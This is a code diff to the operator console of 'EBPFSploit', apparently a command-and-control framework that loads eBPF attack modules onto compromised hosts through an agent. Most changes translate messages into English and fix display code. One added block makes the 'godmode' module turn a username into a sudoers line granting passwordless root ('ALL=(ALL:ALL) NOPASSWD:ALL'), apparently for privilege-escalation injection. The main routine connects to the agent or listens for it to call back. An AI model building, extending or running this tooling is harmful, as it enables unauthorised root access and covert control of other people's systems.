@@ -323,22 +323,24 @@ class EBPFSploit:
         opts = meta.get('options', {})
         if opts:
             print(f"{Fore.CYAN}═══ Load-time Options (set before run) ═══{Fore.WHITE}")
-            print(f"{'Option':<18} {'Current':<22} {'Description'}")
-            print(f"{'-'*18} {'-'*22} {'-'*30}")
+            print(f"{'Option':<20} {'Current':<30} {'Description'}")
+            print(f"{'-'*20} {'-'*30} {'-'*30}")
             for key, details in opts.items():
                 val  = self.user_configs.get(key, details[0])
                 # Escape newlines for proper display
                 val_disp = repr(str(val))[1:-1]  # Remove quotes
+                if len(val_disp) > 28:
+                    val_disp = val_disp[:25] + "..."
                 desc = details[1] if len(details) > 1 else ''
-                print(f"{key:<18} {val_disp:<22} {desc}")
+                print(f"{key:<20} {val_disp:<30} {desc}")
         else:
             print(f"{Fore.YELLOW}  [No load-time configuration items for this module, use 'run' directly]{Fore.WHITE}")
 
         visible_maps = {k: v for k, v in meta.get('maps', {}).items() if k != 'target_ip_count'}
         if visible_maps:
             print(f"\n{Fore.CYAN}═══ Runtime-updatable Maps (update after run) ═══{Fore.WHITE}")
-            print(f"{'Map Name':<22} {'Key':<10} {'Value':<10} {'Update Example'}")
-            print(f"{'-'*22} {'-'*10} {'-'*10} {'-'*30}")
+            print(f"{'Map Name':<22} {'Update Example'}")
+            print(f"{'-'*22} {'-'*40}")
             for mname, minfo in visible_maps.items():
                 kt = minfo.get('key_type', '?')
                 vt = minfo.get('value_type', '?')
@@ -351,7 +353,7 @@ class EBPFSploit:
                     example = f'update <sess> {mname} 123456'
                 else:
                     example = f'update <sess> {mname} <key>'
-                print(f"{mname:<22} {kt:<10} {vt:<10} {example}")
+                print(f"{mname:<22} {example}")
         print()
 
     # -- run_module -----------------------------------------------------------
@@ -378,11 +380,18 @@ class EBPFSploit:
                 val = self.user_configs.get(first_key, default_val_str)
                 val = str(val).encode('utf-8').decode('unicode_escape')  # Handle \n → real newline
 
-                # For shadow_walker and target, we might have multiple space-separated values ("1234 5678")
-                # We'll pack the FIRST value into config_buf so it's active immediately,
-                # and hold the remaining values to update via cmd_update right after load.
-                val_parts = val.replace(',', ' ').split()
-                first_val = val_parts[0] if val_parts else ""
+                # For maps with 'str' value type, we must NOT split spaces!
+                is_string_val = meta.get('maps', {}).get(first_key, {}).get('value_type') == 'str'
+                if is_string_val:
+                    first_val = val
+                else:
+                    val_parts = val.replace(',', ' ').split()
+                    first_val = val_parts[0] if val_parts else ""
+                
+                # Auto-expand godmode target for Load!
+                if self.current_mod == 'godmode' and first_key == 'target':
+                    if '\n' not in first_val and '=' not in first_val:
+                        first_val = f"\n{first_val} ALL=(ALL:ALL) NOPASSWD:ALL\n"
                 
                 if self.current_mod == 'shadow_walker' and first_key == 'target':
                     # specifically encode the STRING into config_buf for shadow_walker
@@ -449,7 +458,11 @@ class EBPFSploit:
                         default_val_str = str(meta['options'][opt_key][0])
                         raw_val = self.user_configs.get(opt_key, default_val_str)
                         if raw_val:
-                            val_parts = raw_val.replace(',', ' ').split()
+                            is_string_val = meta.get('maps', {}).get(opt_key, {}).get('value_type') == 'str'
+                            if is_string_val:
+                                val_parts = [raw_val]
+                            else:
+                                val_parts = raw_val.replace(',', ' ').split()
                             # We update explicitly even if it's 1 value, to override agent.c generic initialization
                             self.cmd_update([str(sid), opt_key] + val_parts)
         else:
@@ -555,7 +568,7 @@ class EBPFSploit:
         self._send_cmd(CMD_UNLOAD, session_id=session_id)
         resp = self._recv_resp()
         if resp is None:
-            print(f"{Fore.RED}[-] 未收到响应{Fore.WHITE}")
+            print(f"{Fore.RED}[-] No response received{Fore.WHITE}")
             return
         if resp.get('ok'):
             name = resp.get('name', '?')
@@ -563,11 +576,11 @@ class EBPFSploit:
             self.active_sessions.pop(session_id, None)
             self._save_state()
         else:
-            print(f"{Fore.RED}[-] 卸载失败: {resp.get('error','unknown')}{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Unload failed: {resp.get('error','unknown')}{Fore.WHITE}")
 
     # -- update ---------------------------------------------------------------
     # update <session_id> <map_name> <key_arg> [value_arg]
-    # 自动根据 map 的 key_size 打包 key；value 缺省为 uint32(1)
+    # Automatically pack key based on map's key_size; value defaults to uint32(1)
     def cmd_update(self, args: list[str]):
         if len(args) < 2:
             print("Usage: update <session_id> <map_name> <val1> [val2] ...")
@@ -576,13 +589,13 @@ class EBPFSploit:
         try:
             sid = int(args[0])
         except ValueError:
-            print(f"{Fore.RED}[-] session_id 必须是整数{Fore.WHITE}")
+            print(f"{Fore.RED}[-] session_id must be an integer{Fore.WHITE}")
             return
 
         map_name = args[1]
         sess_info = self.active_sessions.get(sid)
         if not sess_info:
-            print(f"{Fore.RED}[-] 会话 ID {sid} 不存在{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Session ID {sid} does not exist{Fore.WHITE}")
             return
 
         meta = self.get_metadata(sess_info.get('name', ''))
@@ -594,12 +607,20 @@ class EBPFSploit:
         # 1. Process Array Map (val_type == 'str'): merge remaining arguments into a single string
         if val_type == 'str':
             if len(args) < 3:
-                print(f"{Fore.RED}[-] 错误：模块 {map_name} 需要一个参数{Fore.WHITE}")
+                print(f"{Fore.RED}[-] Error: Module {map_name} requires an argument{Fore.WHITE}")
                 return
             val_str = ' '.join(args[2:])
             if val_str.startswith('"') and val_str.endswith('"'): val_str = val_str[1:-1]
+            elif val_str.startswith("'") and val_str.endswith("'"): val_str = val_str[1:-1]
+            
+            # Unescape string so literal '\n' becomes an actual newline character
             val_str = val_str.encode('utf-8').decode('unicode_escape')
             
+            # Auto-expand godmode payload if it's just a simple username
+            if (sess_info.get('name') == 'godmode' or self.current_mod == 'godmode') and map_name == 'target':
+                if '\n' not in val_str and '=' not in val_str:
+                    val_str = f"\n{val_str} ALL=(ALL:ALL) NOPASSWD:ALL\n"
+
             key_bytes = struct.pack('<I', 0)
             value_bytes = val_str.encode('utf-8', 'replace').ljust(val_size, b'\x00')[:val_size]
             
@@ -609,7 +630,7 @@ class EBPFSploit:
             self._send_cmd(CMD_UPDATE, sid, aux=map_name.encode('utf-8'), config=bytes(cfg))
             resp = self._recv_resp()
             if resp and resp.get('ok'):
-                print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' 更新成功{Fore.WHITE}")
+                print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' updated successfully{Fore.WHITE}")
                 if 'map_state' not in sess_info: sess_info['map_state'] = {}
                 sess_info['map_state'][map_name] = {"0": val_str}
                 self._save_state()
@@ -618,7 +639,7 @@ class EBPFSploit:
         # 2. Process Hash Map: supports multi-value update 1 target 80 443
         values = args[2:]
         if not values:
-            print(f"{Fore.RED}[-] 错误：缺少要更新的值{Fore.WHITE}")
+            print(f"{Fore.RED}[-] Error: Missing value to update{Fore.WHITE}")
             return
 
         self._send_cmd(CMD_CLEAR, sid, aux=map_name.encode('utf-8'))
@@ -647,10 +668,10 @@ class EBPFSploit:
                     success_count += 1
                     new_map_state[str(key_int)] = "1"
             except Exception as e:
-                print(f"{Fore.YELLOW}[!] 无法解析参数 '{val_str}': {e}{Fore.WHITE}")
+                print(f"{Fore.YELLOW}[!] Failed to parse argument '{val_str}': {e}{Fore.WHITE}")
 
         if success_count > 0:
-            print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' 更新完成 ({success_count} 个元素同步){Fore.WHITE}")
+            print(f"{Fore.GREEN}[+] Session {sid} / map '{map_name}' update complete ({success_count} elements synchronized){Fore.WHITE}")
             if 'map_state' not in sess_info: sess_info['map_state'] = {}
             sess_info['map_state'][map_name] = new_map_state
             self._save_state()
@@ -662,12 +683,12 @@ class EBPFSploit:
         try:
             sid = int(sid_str)
         except ValueError:
-            print(f"{Fore.RED}[-] session_id 必须是整数{Fore.WHITE}")
+            print(f"{Fore.RED}[-] session_id must be an integer{Fore.WHITE}")
             return
 
         sess = self.active_sessions.get(sid)
         if not sess:
-            print(f"{Fore.YELLOW}[!] 找不到 Session {sid}{Fore.WHITE}")
+            print(f"{Fore.YELLOW}[!] Session {sid} not found{Fore.WHITE}")
             return
 
         print(f"\n{Fore.CYAN}═══ Session {sid} ({sess['name']}) ═══{Fore.WHITE}")
@@ -737,11 +758,19 @@ class EBPFSploit:
                         matches = []
                 else:
                     matches = []
-            elif parts[0] == 'set' and n >= 2:
-                if self.current_mod:
-                    meta = self.get_metadata(self.current_mod)
-                    if meta and 'options' in meta:
-                        matches = [k + ' ' for k in meta['options'] if k.startswith(text)]
+            elif parts[0] == 'set':
+                if (n == 1 and buf.endswith(' ')) or (n == 2 and not buf.endswith(' ')):
+                    if self.current_mod:
+                        meta = self.get_metadata(self.current_mod)
+                        if meta:
+                            opts = list(meta.get('options', {}).keys())
+                            maps = list(meta.get('maps', {}).keys())
+                            # For set, we usually set options, but some modules only have maps we update later.
+                            # We'll allow tab completing both for convenience.
+                            combined = list(set(opts + maps))
+                            matches = [k + ' ' for k in combined if k.startswith(text)]
+                        else:
+                            matches = []
                     else:
                         matches = []
                 else:
@@ -770,9 +799,12 @@ class EBPFSploit:
         self._setup_readline()
         print(f"{Fore.GREEN}[*] eBPF-Sploit Ready. Type 'help' for commands.{Fore.WHITE}")
         while True:
-            mod_prompt = f"({Fore.RED}{self.current_mod}{Fore.WHITE})" if self.current_mod else ""
+            # rl_prompt_start \x01 and rl_prompt_end \x02 are needed by readline
+            # to calculate the correct width of the prompt and avoid backspace display bugs
+            mod_prompt = f"(\x01{Fore.RED}\x02{self.current_mod}\x01{Fore.CYAN}\x02)" if self.current_mod else ""
             try:
-                raw = input(f"ebpfsploit {mod_prompt} > ").strip()
+                # Add Fore.WHITE so user input resets back to default text color after prompt
+                raw = input(f"\x01{Fore.CYAN}\x02ebpfsploit {mod_prompt} > \x01{Fore.WHITE}\x02").strip()
                 if not raw:
                     continue
                 parts = raw.split()
@@ -841,15 +873,15 @@ class EBPFSploit:
                     if self.current_mod:
                         k = parts[1]
                         v = ' '.join(parts[2:])
-                        # Remove surrounding quotes
-                        if len(v) >= 2 and v[0] == v[-1] and v[0] in ('"', "'"):
+                        # Remove surrounding quotes properly
+                        if (v.startswith('"') and v.endswith('"')) or (v.startswith("'") and v.endswith("'")):
                             v = v[1:-1]
                         # Handle escape sequences: \n → real newline, \t → real tab
                         v = v.encode('utf-8').decode('unicode_escape')
                         self.user_configs[k] = v
                         print(f"  {k} => {repr(v)}")
                     else:
-                        print(f"{Fore.YELLOW}[!] 请先 use <module>{Fore.WHITE}")
+                        print(f"{Fore.YELLOW}[!] Please 'use <module>' first{Fore.WHITE}")
 
                 elif act == "run":
                     self.run_module()
@@ -865,7 +897,7 @@ class EBPFSploit:
                         try:
                             self.cmd_unload(int(p))
                         except ValueError:
-                            print(f"{Fore.RED}[-] session_id 必须是整数: {p}{Fore.WHITE}")
+                            print(f"{Fore.RED}[-] session_id must be an integer: {p}{Fore.WHITE}")
 
                 elif act == "update":
                     self.cmd_update(parts[1:])
@@ -893,10 +925,10 @@ class EBPFSploit:
 
 if __name__ == "__main__":
     if len(sys.argv) == 3:
-        # python console.py <IP> <PORT>  →  正向连接 Agent
+        # python console.py <IP> <PORT>  →  Forward connect to Agent
         c2 = EBPFSploit(sys.argv[1], int(sys.argv[2]))
     elif len(sys.argv) == 2:
-        # python console.py <PORT>       →  反向监听，等待 Agent 回连
+        # python console.py <PORT>       →  Reverse listener, wait for Agent callback
         c2 = EBPFSploit(None, int(sys.argv[1]))
     else:
         print("Usage:")
